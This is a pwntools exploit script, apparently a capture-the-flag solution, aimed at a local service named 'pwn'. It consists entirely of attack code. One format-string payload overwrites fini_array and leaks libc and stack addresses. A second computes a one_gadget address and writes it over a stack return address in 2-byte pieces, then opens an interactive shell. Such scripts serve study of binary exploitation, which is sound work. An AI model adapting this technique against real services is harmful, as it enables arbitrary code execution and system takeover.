from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'

p=remote('127.0.0.1',9999)
#p=process('./pwn')
fini_array=0x600998
payload=b'%230c%9$hhn%41$p%42$paaa'+p64(fini_array)
#gdb.attach(p)
p.sendafter(b'What do you want to say?\n',payload)

p.recvuntil(b'0x')
libcbase=int(p.recvuntil(b'0x')[:-2].decode(),16)-0x20840
stack=int(p.recvuntil(b'aaa')[:-3].decode(),16)-0x1f0
print(hex(libcbase))
print(hex(stack))

one_addr=libcbase+0x45226

data=p64(one_addr)[:-2]
print(hex(one_addr))
split_data=[data[i:i+2] for i in range(0,len(data),2)]
number_set={(int.from_bytes(chunk,'little'),index) for index,chunk in enumerate(split_data)}
sorted_set=sorted(number_set)

payload=b'%'+str(sorted_set[0][0]).encode()+b'c'
payload+=b'%11$hn'
payload+=b'%'+str(sorted_set[1][0]-sorted_set[0][0]).encode()+b'c'
payload+=b'%12$hn'
payload+=b'%'+str(sorted_set[2][0]-sorted_set[1][0]).encode()+b'c'
payload+=b'%13$hn'

payload=payload.ljust(40,b'a')
payload+=p64(stack+sorted_set[0][1]*2)+p64(stack+sorted_set[1][1]*2)
payload+=p64(stack+sorted_set[2][1]*2)

print(sorted_set)
print(payload)
print(len(payload))

#gdb.attach(p)
p.sendafter(b'What do you want to say?\n',payload.ljust(0x100,b'\x00'))

p.interactive()
